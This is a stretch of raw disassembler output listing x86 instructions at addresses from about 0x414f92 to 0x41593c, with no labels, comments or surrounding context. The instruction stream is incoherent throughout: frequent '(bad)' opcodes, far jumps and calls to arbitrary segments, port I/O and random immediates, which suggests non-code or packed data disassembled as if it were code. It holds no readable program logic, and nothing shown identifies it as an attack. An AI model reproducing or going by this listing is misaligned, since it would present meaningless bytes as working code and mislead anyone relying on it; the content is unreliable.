  414f92:	shl    DWORD PTR [ebx-0x40132b7d],1
  414f98:	sbb    BYTE PTR [esi-0x497fef90],ch
  414f9e:	cmp    BYTE PTR [eax+ebx*8-0x51f910a0],ch
  414fa5:	xor    ecx,ecx
  414fa7:	leave  
  414fa8:	lock push edi
  414faa:	gs push edx
  414fac:	inc    esp
  414fad:	sbb    BYTE PTR [eax],cl
  414faf:	push   edi
  414fb0:	ror    DWORD PTR [esi+eiz*1+0x51a2f6c3],cl
  414fb7:	mov    ebx,0x674a9134
  414fbc:	aam    0x4d
  414fbe:	jle    0x415026
  414fc0:	pop    esp
  414fc1:	mov    al,0x24
  414fc3:	pop    ecx
  414fc4:	push   0x23
  414fc6:	and    BYTE PTR ds:0x3b18764f,bl
  414fcc:	ins    DWORD PTR es:[edi],dx
  414fcd:	(bad)
  414fd0:	mov    edx,0x4053c6b5
  414fd5:	fimul  WORD PTR [edx+0x42]
  414fd8:	sqrtps xmm0,xmm6
  414fdb:	jmp    0x2e24:0x97b953fc
  414fe2:	mov    ds:0x99d34002,eax
  414fe7:	fadd   DWORD PTR [esi]
  414fe9:	pop    es
  414fea:	mov    ebx,0x295de35c
  414fef:	mov    bh,0x5b
  414ff1:	xor    ch,BYTE PTR [eax-0xeb99f5e]
  414ff7:	jmp    0x2fdd:0xe6681b00
  414ffe:	or     al,0x67
  415000:	repz add al,0xdf
  415003:	sub    al,dh
  415005:	mov    dl,ch
  415007:	inc    esp
  415008:	bound  edx,QWORD PTR [edx]
  41500a:	scas   al,BYTE PTR es:[edi]
  41500b:	aas    
  41500c:	jecxz  0x415024
  41500e:	pop    esi
  41500f:	push   cs
  415010:	(bad)  
  415011:	test   DWORD PTR [ebp+0x45],0x8646dc1c
  415018:	mov    edi,0xbb226f30
  41501d:	inc    ecx
  41501e:	sti    
  41501f:	inc    eax
  415020:	arpl   WORD PTR [ecx+0x216b329a],di
  415026:	xor    BYTE PTR [ebx],ah
  415028:	lods   al,BYTE PTR ds:[esi]
  415029:	div    DWORD PTR [ebp-0x2]
  41502c:	mov    eax,0xbbb71a4a
  415031:	int3   
  415032:	test   cl,bh
  415034:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415035:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415036:	sbb    DWORD PTR [ecx-0x43],esi
  415039:	in     al,dx
  41503a:	into   
  41503b:	sub    DWORD PTR [eax+0x55],esi
  41503e:	outs   dx,DWORD PTR ds:[esi]
  41503f:	dec    ecx
  415040:	pop    esp
  415041:	call   0x8b39:0xe349a043
  415048:	aam    0x3a
  41504a:	jecxz  0x414ff4
  41504c:	test   DWORD PTR [edi+0x5],esp
  41504f:	push   es
  415050:	test   BYTE PTR [ebx-0x41],0xad
  415054:	push   es
  415055:	pop    ebp
  415056:	ins    DWORD PTR es:[edi],dx
  415057:	and    BYTE PTR [edi],0xeb
  41505a:	pop    ecx
  41505b:	pop    edi
  41505c:	cs loop 0x41502e
  41505f:	jmp    0xa5d45fa8
  415064:	xchg   BYTE PTR [eax-0xa],cl
  415067:	gs cs (bad) 
  41506a:	ja     0x4150e8
  41506c:	jne    0x41502e
  41506e:	xchg   ecx,eax
  41506f:	add    bl,dl
  415071:	ja     0x415047
  415073:	or     BYTE PTR [ecx],dh
  415075:	fs retf 0x3c05
  415079:	stc    
  41507a:	ror    ebp,cl
  41507c:	and    ebp,ecx
  41507e:	push   esp
  41507f:	xor    al,0x3a
  415081:	jp     0x41500f
  415083:	retf   0x8c13
  415086:	fwait
  415087:	and    dl,BYTE PTR [ecx*2-0x1d769449]
  41508e:	adc    eax,0x4041fe69
  415093:	jbe    0x4150ef
  415095:	inc    esp
  415096:	in     al,0x2d
  415098:	pop    esi
  415099:	or     esp,DWORD PTR [ebx+0x25]
  41509c:	pop    eax
  41509d:	imul   edi,DWORD PTR [edi+ebx*4],0x26
  4150a1:	imul   DWORD PTR [esi-0x7a]
  4150a4:	loope  0x4150b2
  4150a6:	sub    ebx,DWORD PTR [edx-0x5670c23]
  4150ac:	fstp   DWORD PTR [ebx+0xbb6557e]
  4150b2:	call   0xea58e757
  4150b7:	rcl    BYTE PTR [ebp+edx*2+0x15],0x42
  4150bc:	push   ds
  4150bd:	retf   
  4150be:	cmp    esp,esp
  4150c0:	stc    
  4150c1:	out    dx,al
  4150c2:	mov    ss,WORD PTR [esi+edx*2+0x100c1efb]
  4150c9:	pop    edx
  4150ca:	add    eax,0xf4418aa1
  4150cf:	push   0xf653532b
  4150d4:	push   ecx
  4150d5:	xor    dh,BYTE PTR [esi+eax*4-0x8]
  4150d9:	stos   BYTE PTR es:[edi],al
  4150da:	stos   BYTE PTR es:[edi],al
  4150db:	xchg   BYTE PTR [ebx],ch
  4150dd:	lods   eax,DWORD PTR ds:[esi]
  4150de:	sub    dl,dh
  4150e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150e1:	out    0xba,al
  4150e3:	ret    0xb3cc
  4150e6:	or     dl,dl
  4150e8:	xchg   ebx,eax
  4150e9:	pop    ebx
  4150ea:	xlat   BYTE PTR ds:[ebx]
  4150eb:	adc    DWORD PTR [esi],esp
  4150ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150ee:	sub    ebx,ebx
  4150f0:	and    DWORD PTR [ebp-0x76],0x35
  4150f4:	in     al,0x43
  4150f6:	jae    0x41510a
  4150f8:	fist   DWORD PTR es:[ebx-0x7dd83e25]
  4150ff:	push   ss
  415100:	(bad)  
  415101:	outs   dx,BYTE PTR ds:[esi]
  415102:	fld    QWORD PTR [ebp*8+0x3529db9a]
  415109:	mov    WORD PTR [ecx+0x5c],cs
  41510c:	xor    ch,ch
  41510e:	dec    ebx
  41510f:	arpl   di,bx
  415111:	int    0x9d
  415113:	sbb    DWORD PTR ds:0x6da751f4,esi
  415119:	call   0xa412:0x1cfa79ac
  415120:	out    dx,eax
  415121:	xchg   edi,eax
  415122:	sbb    esi,ebp
  415124:	ret    
  415125:	lds    edi,FWORD PTR [esi+0x67]
  415128:	outs   dx,DWORD PTR ds:[esi]
  415129:	in     eax,0x23
  41512b:	add    BYTE PTR es:[eax],al
	...
  415302:	add    BYTE PTR [eax],al
  415304:	xchg   BYTE PTR [eax-0x30],ah
  415307:	dec    eax
  415308:	idiv   al
  41530a:	sahf   
  41530b:	out    dx,al
  41530c:	or     eax,0xe0b0d536
  415311:	cmp    al,0xe3
  415313:	aaa    
  415314:	outs   dx,DWORD PTR ds:[esi]
  415315:	push   0x71e0001
  41531a:	add    BYTE PTR [eax],al
  41531c:	fimul  WORD PTR [eax-0x41f23c4]
  415322:	mov    al,0x7f
  415324:	stos   DWORD PTR es:[edi],eax
  415325:	mov    ebx,DWORD PTR [ebp-0x52]
  415328:	retf   
  415329:	dec    ecx
  41532a:	pusha  
  41532b:	outs   dx,DWORD PTR ds:[esi]
  41532c:	cmp    BYTE PTR [ebx+0x69],ch
  41532f:	lahf   
  415330:	lods   eax,DWORD PTR ds:[esi]
  415331:	and    BYTE PTR [ebp-0x2a526e13],0xe6
  415338:	sbb    al,0xe3
  41533a:	xor    BYTE PTR [edx+0x2],bl
  41533d:	cmp    dl,bl
  41533f:	dec    ebp
  415340:	mov    DWORD PTR [edi],edx
  415342:	or     dh,BYTE PTR [edi-0x40dc99e7]
  415348:	adc    al,0x8f
  41534a:	idiv   edi
  41534c:	sti    
  41534d:	push   ebp
  41534e:	fild   DWORD PTR [edi+0x49909b4]
  415354:	or     al,0x73
  415356:	jmp    DWORD PTR [edi]
  415358:	sbb    al,0xc5
  41535a:	dec    DWORD PTR [ebx]
  41535c:	xor    eax,0xde759886
  415361:	(bad)
  415364:	daa    
  415365:	push   es
  415366:	pushf  
  415367:	test   dl,0x49
  41536a:	fdivr  QWORD PTR [edi]
  41536c:	xor    eax,0x8c25141c
  415371:	xor    ecx,DWORD PTR [ebx]
  415373:	nop
  415374:	dec    edx
  415375:	mov    esp,0x4ddf23a
  41537a:	jmp    0xe367e58
  41537f:	cld    
  415380:	cli    
  415381:	inc    edi
  415382:	sar    dh,1
  415384:	loopne 0x415354
  415386:	mov    dl,0x9a
  415388:	ins    BYTE PTR es:[edi],dx
  415389:	or     edi,ebx
  41538b:	and    DWORD PTR [ecx],0xffffffd4
  41538e:	iret   
  41538f:	(bad)  
  415390:	aaa    
  415391:	test   BYTE PTR [ecx+0x79],0x57
  415395:	jno    0x41539e
  415397:	adc    DWORD PTR [edx-0x5e1ee8fb],eax
  41539d:	jge    0x415379
  41539f:	mov    ecx,0x9f048eb
  4153a4:	mov    al,0xb4
  4153a6:	xor    bh,dl
  4153a8:	ficom  DWORD PTR [esi+0x150cd301]
  4153ae:	jge    0x415332
  4153b0:	inc    ecx
  4153b1:	into   
  4153b2:	loopne 0x415397
  4153b4:	sub    eax,0x55072201
  4153b9:	ins    BYTE PTR es:[edi],dx
  4153ba:	ja     0x415352
  4153bc:	push   ecx
  4153bd:	push   ds
  4153be:	or     al,0x4
  4153c0:	cli    
  4153c1:	add    DWORD PTR [eax-0x1e],ebp
  4153c4:	leave  
  4153c5:	test   eax,0xde8cbc75
  4153ca:	fistp  WORD PTR [eax]
  4153cc:	addr16 push edx
  4153ce:	add    eax,0xfdad3c60
  4153d3:	inc    esp
  4153d4:	mov    esi,0x54eab3dc
  4153d9:	mov    esp,0x905a0726
  4153de:	(bad)  
  4153df:	mov    edi,?
  4153e1:	push   ebp
  4153e2:	fabs   
  4153e4:	or     DWORD PTR [eax],ecx
  4153e6:	dec    ecx
  4153e7:	jnp    0x4153bc
  4153e9:	or     esi,DWORD PTR [ebp-0xa1d31ff]
  4153ef:	outs   dx,BYTE PTR ds:[esi]
  4153f0:	dec    ebx
  4153f1:	fmul   DWORD PTR [ebp-0x48]
  4153f4:	cmp    esp,esi
  4153f6:	xor    ecx,DWORD PTR [eax+0x1c4ddb3b]
  4153fc:	cli    
  4153fd:	data16 sahf 
  4153ff:	push   cs
  415400:	pop    ebp
  415401:	add    ch,ah
  415403:	xor    bl,ch
  415405:	stos   BYTE PTR es:[edi],al
  415406:	sbb    DWORD PTR [esi+eiz*4+0x58],ebp
  41540a:	cmc    
  41540b:	fwait
  41540c:	dec    esi
  41540d:	dec    esi
  41540e:	leave  
  41540f:	push   edx
  415410:	mov    cl,BYTE PTR ds:0x16e48d41
  415416:	cld    
  415417:	add    eax,DWORD PTR ds:0x3b021874
  41541d:	in     al,dx
  41541e:	xchg   BYTE PTR [eax],bh
  415420:	test   BYTE PTR [eax],bh
  415422:	enter  0x30c7,0xce
  415426:	fild   QWORD PTR [edi]
  415428:	mov    dl,0x51
  41542a:	(bad)  
  41542b:	call   0x7efb:0x888c4f9b
  415432:	adc    ah,dl
  415434:	xchg   ebx,eax
  415435:	inc    ecx
  415436:	mov    bl,0x70
  415438:	sbb    DWORD PTR [eax+0x73ed628f],edi
  41543e:	cld    
  41543f:	les    edi,FWORD PTR [ebp+0x4e]
  415442:	in     al,0xbd
  415444:	mov    edx,0x9786d423
  415449:	enter  0xe2cc,0x0
  41544d:	shl    DWORD PTR [edi+0x6c5d0ab6],cl
  415453:	pop    ebp
  415454:	enter  0x704,0x66
  415458:	pop    ds
  415459:	cmp    BYTE PTR [ebp+0x42],ch
  41545c:	jmp    ebp
  41545e:	ds (bad) 
  415460:	dec    esp
  415461:	sub    edx,edx
  415463:	dec    edi
  415464:	aad    0xad
  415466:	lea    esp,[ecx+0x19]
  415469:	iret   
  41546a:	mov    edx,0xeba826c0
  41546f:	aad    0x48
  415471:	pop    ss
  415472:	xchg   dl,dl
  415474:	dec    edx
  415475:	push   0x7f
  415477:	xchg   DWORD PTR [ecx+0x2b],edi
  41547a:	shr    BYTE PTR [edx-0x16b9e3bf],1
  415480:	lods   al,BYTE PTR ds:[esi]
  415481:	sub    esi,DWORD PTR [edx-0x24]
  415484:	xchg   esp,eax
  415485:	inc    ebp
  415486:	jmp    0x91ab:0x2bd5731e
  41548d:	sub    edi,DWORD PTR [edx+0x161b79ac]
  415493:	icebp  
  415494:	jg     0x4154b8
  415496:	popa   
  415497:	(bad)  
  415498:	cmp    cl,bl
  41549a:	mov    dh,BYTE PTR [edx-0x3a]
  41549d:	jns    0x4154d4
  41549f:	ja     0x4154a5
  4154a1:	jns    0x4154d3
  4154a3:	xlat   BYTE PTR ds:[ebx]
  4154a4:	scas   eax,DWORD PTR es:[edi]
  4154a5:	xlat   BYTE PTR ds:[ebx]
  4154a6:	js     0x4154b6
  4154a8:	mov    esp,0x648d1a2f
  4154ad:	jge    0x41552d
  4154af:	inc    esp
  4154b0:	xchg   BYTE PTR [esi],dh
  4154b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154b3:	dec    BYTE PTR [ebx+0x3d]
  4154b6:	rcr    DWORD PTR [eax+ebx*4],cl
  4154b9:	popa   
  4154ba:	pop    ebp
  4154bb:	and    esp,DWORD PTR ds:0xfd8095d5
  4154c1:	pop    edi
  4154c2:	out    0x73,eax
  4154c4:	in     al,0x7a
  4154c6:	mov    dl,0x43
  4154c8:	and    esp,ebx
  4154ca:	mov    ch,0xc8
  4154cc:	inc    edi
  4154cd:	retf   
  4154ce:	clc    
  4154cf:	add    BYTE PTR [edx-0x27207255],0x32
  4154d6:	cwde   
  4154d7:	in     eax,0xf2
  4154d9:	jecxz  0x4154bf
  4154db:	jnp    0x415518
  4154dd:	int    0xf5
  4154df:	jg     0x415487
  4154e1:	retf   
  4154e2:	les    esp,FWORD PTR ds:0xfb5992c5
  4154e8:	mov    eax,0xb07a6cc1
  4154ed:	inc    esi
  4154ee:	shr    BYTE PTR [edx-0x46335f53],1
  4154f4:	test   al,0x62
  4154f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154f7:	dec    esi
  4154f8:	mov    ds:0xb7f271dc,al
  4154fd:	push   eax
  4154fe:	mul    ch
  415500:	popf   
  415501:	ins    DWORD PTR es:[edi],dx
  415502:	and    DWORD PTR [ecx-0x12],eax
  415505:	cmp    eax,0x64545bc2
  41550a:	in     al,dx
  41550b:	push   ds
  41550c:	ja     0x4154fa
  41550e:	push   0xcceab5a2
  415513:	pop    esi
  415514:	ds sahf 
  415516:	aaa    
  415517:	push   esi
  415518:	or     al,0x5a
  41551a:	mov    bh,0xb3
  41551c:	or     al,0x78
  41551e:	hlt    
  41551f:	(bad)  
  415521:	mov    bh,bh
  415523:	mov    eax,0x2a55e049
  415528:	scas   eax,DWORD PTR es:[edi]
  415529:	xor    bl,bh
  41552b:	mov    ds:0x98193715,eax
  415530:	out    dx,al
  415531:	pusha  
  415532:	sbb    BYTE PTR [esi-0x2],ah
  415535:	xor    al,0xee
  415537:	or     ch,cl
  415539:	xchg   ebp,eax
  41553a:	mov    ebx,0x4af5c680
  41553f:	dec    eax
  415540:	xor    ebp,DWORD PTR [edx+0x8aab663]
  415546:	aad    0x8e
  415548:	dec    edx
  415549:	push   ebx
  41554a:	in     eax,dx
  41554b:	jp     0x41553c
  41554d:	test   BYTE PTR [edx+edi*1-0x50],0x6b
  415552:	(bad)  
  415553:	mov    fs,WORD PTR [esi-0x19f718a]
  415559:	xor    al,0xef
  41555b:	lods   eax,DWORD PTR ds:[esi]
  41555c:	fsubr  QWORD PTR [edi]
  41555e:	stos   DWORD PTR es:[edi],eax
  41555f:	(bad)  
  415560:	fnsave cs:[ebp+0x4d72a5d0]
  415567:	mov    BYTE PTR [ebp+0x7b],0x3b
  41556b:	iret   
  41556c:	mov    ch,0x5e
  41556e:	daa    
  41556f:	jae    0x415533
  415571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415572:	loope  0x415506
  415574:	scas   eax,DWORD PTR es:[edi]
  415575:	inc    ecx
  415576:	pop    edi
  415577:	and    edi,esp
  415579:	and    esp,DWORD PTR [ebx]
  41557b:	ret    0xca48
  41557e:	cmp    al,0x96
  415580:	jnp    0x4155f8
  415582:	shr    DWORD PTR [esi-0x69f552be],0xf1
  415589:	adc    bl,BYTE PTR [esi]
  41558b:	jge    0x41553d
  41558d:	in     eax,dx
  41558e:	cli    
  41558f:	and    ah,cl
  415591:	imul   esp,DWORD PTR [ecx+0xc],0xffffffbc
  415595:	fs and eax,0x482150d0
  41559b:	sti    
  41559c:	ja     0x415599
  41559e:	jmp    0x5660b23a
  4155a3:	dec    edi
  4155a4:	loopne 0x4155b0
  4155a6:	inc    edx
  4155a7:	dec    ecx
  4155a8:	ds sbb bl,al
  4155ab:	mov    ebx,DWORD PTR [ecx]
  4155ad:	aas    
  4155ae:	jmp    0x4155ee
  4155b0:	dec    edi
  4155b1:	test   eax,0x5539fdd2
  4155b6:	push   eax
  4155b7:	push   esp
  4155b8:	ret    0xeac5
  4155bb:	jmp    0x41562c
  4155bd:	icebp  
  4155be:	cmp    al,BYTE PTR [esi+0x22e0c4be]
  4155c4:	int3   
  4155c5:	clc    
  4155c6:	sti    
  4155c7:	loopne 0x415626
  4155c9:	sub    eax,0xf6d7bb19
  4155ce:	push   ebx
  4155cf:	inc    edi
  4155d0:	and    eax,0xcb964f62
  4155d5:	shl    DWORD PTR [edi+0x3b],1
  4155d8:	jl     0x415579
  4155da:	out    0x25,eax
  4155dc:	mov    esi,0xb5e6216d
  4155e1:	fiadd  DWORD PTR [ecx+0xb]
  4155e4:	sub    esp,esp
  4155e6:	ret    0x3342
  4155e9:	pop    edx
  4155ea:	mov    ebx,DWORD PTR [esi+eiz*2]
  4155ed:	iret   
  4155ee:	xor    DWORD PTR [ecx+0x17],edi
  4155f1:	mov    esi,0xd10eb40b
  4155f6:	shr    cl,0xc4
  4155f9:	cmp    edx,DWORD PTR [eax-0x5275c77c]
  4155ff:	cs jnp 0x415614
  415602:	out    dx,eax
  415603:	retf   0x9901
  415606:	sar    DWORD PTR [ebp+0x6b],0xa
  41560a:	pop    ebx
  41560b:	lods   eax,DWORD PTR ds:[esi]
  41560c:	loopne 0x41560b
  41560e:	(bad)  
  41560f:	mov    esi,0xa83dd543
  415614:	pop    edx
  415615:	jg     0x415660
  415617:	xor    DWORD PTR ds:0xcba9,edx
  41561c:	mov    ecx,0x325778d6
  415621:	add    DWORD PTR [eax],eax
  415623:	pop    es
  415624:	inc    esp
  415625:	xor    al,0xd3
  415627:	and    eax,0xbf87cac1
  41562c:	jo     0x415612
  41562e:	add    al,0x2d
  415630:	pop    esp
  415631:	jne    0x4155e5
  415633:	inc    ecx
  415634:	popf   
  415635:	lods   al,BYTE PTR ds:[esi]
  415636:	pop    esp
  415637:	loope  0x4155bf
  415639:	fisub  WORD PTR [esp+ebx*1-0x2b]
  41563d:	sahf   
  41563e:	jp     0x4155f7
  415640:	xor    eax,DWORD PTR [eax-0x3090553e]
  415646:	jno    0x415621
  415648:	jl     0x415695
  41564a:	retf   0xa0b2
  41564d:	sbb    dh,BYTE PTR [ebx+0x32]
  415650:	sub    ch,BYTE PTR [ebx-0x63]
  415653:	xchg   edx,eax
  415654:	push   esi
  415655:	gs sbb ebx,0x1e
  415659:	call   0x3f2c:0xd14ddcd6
  415660:	pushf  
  415661:	jo     0x4156cf
  415663:	(bad)  
  415664:	ds jo  0x41566c
  415667:	les    ebp,FWORD PTR [eax+0x177d2a13]
  41566d:	rcl    DWORD PTR ds:0x37d6f4d5,1
  415673:	bound  edi,QWORD PTR [esi]
  415675:	cmp    DWORD PTR [esp-0x4c],0xd
  41567a:	pop    ebx
  41567b:	push   ds
  41567c:	cmp    esp,DWORD PTR [eiz*2+0x52850795]
  415683:	test   BYTE PTR [ebp-0x4f1da2bf],0x32
  41568a:	xchg   esp,eax
  41568b:	jb     0x41566f
  41568d:	stc    
  41568e:	pcmpeqd mm0,mm5
  415691:	call   FWORD PTR [ebx]
  415693:	mov    edx,0xd7c29219
  415698:	add    bh,BYTE PTR [eax-0x6b]
  41569b:	js     0x415702
  41569d:	push   edx
  41569e:	inc    edi
  41569f:	mov    edi,0xdd1d3d8a
  4156a4:	xlat   BYTE PTR ds:[ebx]
  4156a5:	sar    BYTE PTR [edi+0x74],0x56
  4156a9:	(bad)  [edi]
  4156ab:	fdivr  DWORD PTR [ebp+0x34]
  4156ae:	mov    esi,0x8ba0600f
  4156b3:	dec    esp
  4156b4:	mov    al,ds:0x47f5d65d
  4156b9:	adc    ebp,DWORD PTR [ecx-0x6d]
  4156bc:	inc    esp
  4156bd:	fwait
  4156be:	outs   dx,BYTE PTR ds:[esi]
  4156bf:	das    
  4156c0:	cmc    
  4156c1:	xchg   edi,eax
  4156c2:	pop    es
  4156c3:	inc    ebx
  4156c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156c5:	(bad)  
  4156c6:	mov    ebp,0x99fe1294
  4156cb:	(bad)  
  4156cc:	sbb    eax,0xc26dbb53
  4156d1:	pushf  
  4156d2:	xchg   edx,eax
  4156d3:	pop    ebp
  4156d4:	loope  0x415675
  4156d6:	push   eax
  4156d7:	idiv   BYTE PTR [edx+0x40]
  4156da:	mov    ecx,0x1317fe78
  4156df:	int3   
  4156e0:	call   0x9e83:0xa210536a
  4156e7:	xor    esp,edi
  4156e9:	jp     0x4156fa
  4156eb:	jl     0x415728
  4156ed:	mov    dh,0x34
  4156ef:	stos   BYTE PTR es:[edi],al
  4156f0:	mov    cl,0x50
  4156f2:	into   
  4156f3:	ror    BYTE PTR [ecx],0x73
  4156f6:	fdivr  QWORD PTR [esi+ebp*8+0x7b]
  4156fa:	cwde   
  4156fb:	sub    DWORD PTR [ecx-0x52],ebp
  4156fe:	ficomp DWORD PTR [edx]
  415700:	push   0xd2c63bf6
  415705:	mov    edx,0x1e46ac1a
  41570a:	popf   
  41570b:	imul   edx,DWORD PTR [ebx+0x51],0x95e5162f
  415712:	neg    BYTE PTR [eax+esi*2+0x26]
  415716:	cmp    dl,BYTE PTR [eax-0x35]
  415719:	lods   eax,DWORD PTR ds:[esi]
  41571a:	les    edx,FWORD PTR [edx-0x3489bdff]
  415720:	jmp    0x4156fa
  415722:	out    dx,eax
  415723:	adc    DWORD PTR [esi-0x52],eax
  415726:	outs   dx,DWORD PTR ds:[esi]
  415727:	sub    BYTE PTR [ebp+0x2c],0x61
  41572b:	or     esp,ebx
  41572d:	(bad)  
  41572e:	jmp    0x41570c
  415730:	add    eax,0xd797d8b9
  415735:	inc    esi
  415736:	mov    ecx,eax
  415738:	call   0x6236:0x9e39ab18
  41573f:	movsx  cx,BYTE PTR [esi+edx*8-0x7a]
  415745:	inc    esi
  415747:	mov    dh,0xb4
  415749:	jmp    0x34a8:0x74d6c176
  415750:	mov    ds:0xbee22b69,eax
  415755:	out    dx,al
  415756:	jle    0x415769
  415758:	jae    0x415760
  41575a:	rol    BYTE PTR [eax+edi*4+0x56],1
  41575e:	(bad)  
  41575f:	mov    ebp,0xfa6bd581
  415764:	pop    esp
  415765:	in     eax,dx
  415766:	sbb    DWORD PTR [ebp+0x2a],0xffffffde
  41576a:	or     al,0xb8
  41576c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41576d:	push   ebx
  41576e:	fiadd  WORD PTR [edx-0x56]
  415771:	sub    dh,al
  415773:	loop   0x4157eb
  415775:	xchg   edi,eax
  415776:	ins    BYTE PTR es:[edi],dx
  415777:	retf   
  415778:	pop    es
  415779:	sbb    ebx,edi
  41577b:	jmp    0x70b5dcf6
  415780:	cmp    DWORD PTR [ebp+0x65],esi
  415783:	push   eax
  415784:	mov    ds:0xd68ef3d8,eax
  415789:	jp     0x4157ea
  41578b:	dec    ecx
  41578c:	dec    eax
  41578d:	xchg   edx,eax
  41578e:	loop   0x4157df
  415790:	pop    ecx
  415791:	jge    0x415809
  415793:	cmp    bh,BYTE PTR [ecx+0x67c9ad06]
  415799:	lock (bad) 
  41579b:	in     eax,dx
  41579c:	mov    bl,0xb
  41579e:	or     al,0x9e
  4157a0:	jns    0x41575b
  4157a2:	iret   
  4157a3:	push   cs
  4157a4:	sub    eax,0x2d4a3787
  4157a9:	sub    eax,0x1564c2a1
  4157ae:	or     al,0x5e
  4157b0:	or     al,0xff
  4157b2:	sbb    al,0x9e
  4157b5:	and    cl,BYTE PTR [ecx+ebp*1+0x26f021a3]
  4157bc:	je     0x4157a8
  4157be:	adc    eax,DWORD PTR [edi-0x4e]
  4157c1:	ret    
  4157c2:	mov    esi,0x70fe7481
  4157c7:	in     eax,0x1d
  4157c9:	scas   al,BYTE PTR es:[edi]
  4157ca:	push   ds
  4157cb:	xchg   ecx,eax
  4157cc:	call   0xf24408d2
  4157d1:	scas   eax,DWORD PTR es:[edi]
  4157d2:	sbb    DWORD PTR [ebx],0x23
  4157d5:	mov    dh,0x8e
  4157d7:	test   BYTE PTR [ebx],bl
  4157d9:	jl     0x415803
  4157db:	mov    ah,0x16
  4157dd:	loope  0x415835
  4157df:	dec    esp
  4157e0:	mov    ebp,0xc558eae1
  4157e5:	cmp    eax,0xf88c3f93
  4157ea:	xchg   DWORD PTR [esi+0x7f],edi
  4157ed:	scas   al,BYTE PTR es:[edi]
  4157ee:	repz neg al
  4157f1:	mov    dh,BYTE PTR [esi]
  4157f3:	push   edx
  4157f4:	pop    edx
  4157f5:	repz jg 0x4157c5
  4157f8:	fiadd  DWORD PTR [ebx+0x55c7825a]
  4157fe:	sub    dl,dh
  415800:	xor    al,0x53
  415802:	xor    DWORD PTR [ebx-0x1c1078e7],edi
  415808:	into   
  415809:	sahf   
  41580a:	dec    eax
  41580b:	mov    eax,ds:0xbfdc2944
  415810:	add    bl,ch
  415812:	daa    
  415813:	mov    ebx,0xc57b536a
  415818:	nop
  415819:	fst    QWORD PTR [ebp+0x4a1d929f]
  41581f:	push   ebp
  415820:	cmc    
  415821:	lahf   
  415822:	cmp    al,0x75
  415824:	mov    DWORD PTR [esi+0x6c2ae8b2],ebx
  41582a:	int    0x3
  41582c:	in     eax,dx
  41582d:	ror    ah,0x2b
  415830:	arpl   WORD PTR [eax],bx
  415832:	jmp    0x415834
  415834:	jb     0x415886
  415836:	jmp    0x4157f6
  415838:	inc    ecx
  415839:	push   ebx
  41583a:	cmc    
  41583b:	sbb    DWORD PTR [ebp+esi*8+0x16],ebx
  41583f:	test   BYTE PTR [esi+0x5cf238a0],ah
  415845:	int3   
  415846:	sahf   
  415847:	dec    ebx
  415848:	sbb    DWORD PTR [ecx-0x26],edx
  41584b:	popf   
  41584c:	lahf   
  41584d:	cdq    
  41584e:	pop    esp
  41584f:	jmp    0x6e50:0xbc6efdeb
  415856:	jne    0x41580a
  415858:	adc    eax,0x7d219fde
  41585d:	dec    eax
  41585e:	dec    edi
  41585f:	jmp    0x8ee1:0x9b4b4c52
  415866:	into   
  415867:	mov    edx,0xe74edd69
  41586c:	inc    edi
  41586d:	cmp    DWORD PTR [ebx-0x49dd884f],edi
  415873:	jecxz  0x41583b
  415875:	call   0x7bd9:0x16aa82b5
  41587c:	test   eax,0x9b15169a
  415881:	test   DWORD PTR [edi+eiz*8],ecx
  415884:	mov    ds:0xb0baa368,eax
  415889:	icebp  
  41588a:	ja     0x4158a4
  41588c:	test   BYTE PTR [edi+0x5f158dd],al
  415892:	jo     0x4158f3
  415894:	mov    al,0xf0
  415896:	pop    ebp
  415897:	je     0x41582a
  415899:	or     ch,cl
  41589b:	les    ecx,FWORD PTR [edi]
  41589d:	into   
  41589e:	inc    eax
  41589f:	push   DWORD PTR [ecx+0x4f]
  4158a2:	mov    ds:0x8ec9ed91,eax
  4158a7:	in     eax,dx
  4158a8:	clc    
  4158a9:	cld    
  4158aa:	je     0x415834
  4158ac:	mov    dl,0xd6
  4158ae:	xor    al,0x8f
  4158b0:	pop    edi
  4158b1:	jb     0x41584f
  4158b3:	out    dx,al
  4158b4:	cmp    al,0x2f
  4158b6:	scas   al,BYTE PTR es:[edi]
  4158b7:	xchg   ebp,eax
  4158b8:	dec    eax
  4158b9:	push   edi
  4158ba:	mov    dl,0x4f
  4158bc:	cpuid  
  4158be:	lock sti 
  4158c0:	js     0x4158eb
  4158c2:	in     eax,dx
  4158c3:	(bad)
  4158c9:	pop    esi
  4158ca:	aas    
  4158cb:	call   0x63b44015
  4158d0:	push   esp
  4158d1:	sahf   
  4158d2:	inc    edi
  4158d3:	push   0xfffffffa
  4158d5:	adc    al,0xb3
  4158d7:	push   esp
  4158d8:	das    
  4158d9:	xchg   BYTE PTR [esi+0x2f],bh
  4158dc:	fstp   QWORD PTR [ebx-0x6]
  4158df:	jne    0x4158a6
  4158e1:	cs out 0x9b,al
  4158e4:	sub    BYTE PTR [ebx+0xd69fa4c],al
  4158ea:	enter  0x270f,0x17
  4158ee:	bound  ebp,QWORD PTR [ecx]
  4158f0:	jp     0x41591b
  4158f2:	jp     0x41593e
  4158f4:	pop    esp
  4158f5:	push   cs
  4158f6:	icebp  
  4158f7:	call   0xc4c1a63b
  4158fc:	popa   
  4158fd:	in     eax,0xf3
  4158ff:	fsubp  st(2),st
  415901:	mov    ecx,0x6452ca46
  415906:	pop    es
  415907:	je     0x415893
  415909:	sbb    eax,DWORD PTR [ebx+0x20]
  41590c:	sbb    al,0xfd
  41590e:	push   ebx
  41590f:	xlat   BYTE PTR ds:[ebx]
  415910:	sahf   
  415911:	ret    0x1b19
  415914:	jns    0x4158a1
  415916:	pop    edx
  415917:	sub    BYTE PTR [esi-0x2a],ah
  41591a:	pop    ebp
  41591b:	cld    
  41591c:	and    edx,DWORD PTR [ecx+ebp*1+0x10]
  415920:	aas    
  415921:	or     DWORD PTR [ebx],0xffffffb7
  415924:	imul   DWORD PTR ds:0xfd5238ff
  41592a:	ror    DWORD PTR gs:[ecx+0x561878a4],1
  415931:	mov    al,ds:0x43c0b74f
  415936:	cmp    WORD PTR [ebx-0x6f],0xff86
  41593b:	stos   BYTE PTR es:[edi],al
  41593c:	sub    al,0x45
